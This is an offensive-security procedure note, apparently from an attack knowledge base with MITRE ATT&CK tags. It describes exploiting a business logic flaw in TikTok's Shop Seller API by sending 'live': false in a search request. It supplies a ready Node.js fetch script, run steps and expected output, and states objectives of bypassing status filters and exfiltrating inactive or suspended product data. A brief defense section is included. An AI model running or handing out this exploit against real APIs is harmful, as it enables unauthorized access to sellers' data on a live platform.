---
tags:
  - api-exploitation
  - data-leakage
type: procedure
tools:
  - '[[tools/node-fetch]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/node-fetch-post-to-tiktok-api-live-false]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 78793d22-79a0-44f2-bf27-c8739cd43b39
created_at: '2025-12-14T17:28:36.440Z'
updated_at: '2025-12-14T17:28:36.440Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send-POST-Request-with-Live-False-Using-Node-Fetch

## Summary

Craft and execute a POST request to TikTok's Shop Seller API 'Search Product' endpoint with 'live': false to exploit the business logic flaw and retrieve inactive product data.

## Description

This procedure demonstrates the core exploitation by modifying the 'live' parameter in the JSON payload sent to the API. The endpoint https://*.tiktok.com/api/v1/xyz processes the request without proper validation, leaking sensitive information. Requires Node.js environment and node-fetch library. Assumes authenticated session via headers.

## Requirements

1. Node.js installed
2. node-fetch library (npm install node-fetch)
3. Valid API authentication headers
4. Target endpoint URL

## Defense

Defensive measures and detection strategies:

- Enforce server-side filtering regardless of client parameters
- Audit API logs for 'live': false requests
- Use WAF rules to block anomalous payloads

## Objectives

1. Bypass product status filters
2. Exfiltrate inactive/suspended product details
3. Confirm unauthorized data access

## Instructions

### Step 1: Prepare Script

**Context**: Set up the Node.js script with the tampered payload.

**Command** ([[commands/node-fetch-post-to-tiktok-api-live-false]]):
```javascript
const fetch =require('node-fetch'); const url ='https://*.tiktok.com/api/v1/xyz'; const postData ={campaign_id:"0",product_name:"",page_index:1,page_size:30,live:false}; const headers ={// headers}; fetch(url,{method:'POST',headers: headers,body:JSON.stringify(postData)}).then(response=>{if(!response.ok){throw new Error('error');}return response.json();}).then(data=>{ console.log(data);}).catch(error=>{ console.error('fetch error:', error);});
```

> This sends the POST with 'live': false. Expected output: JSON with product data including inactive items (e.g., code: 0, data: [{product_id: ..., status: 'suspended'}]).

### Step 2: Execute and Review

**Context**: Run the script and inspect the response for leaked data.

Execute via `node script.js`.

> Expected output: Console log of API response showing sensitive product info.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/node-fetch-post-to-tiktok-api-live-false]]

## Tools Used

- [[tools/node-fetch]]

## Tags

- api-exploitation
- parameter-tampering
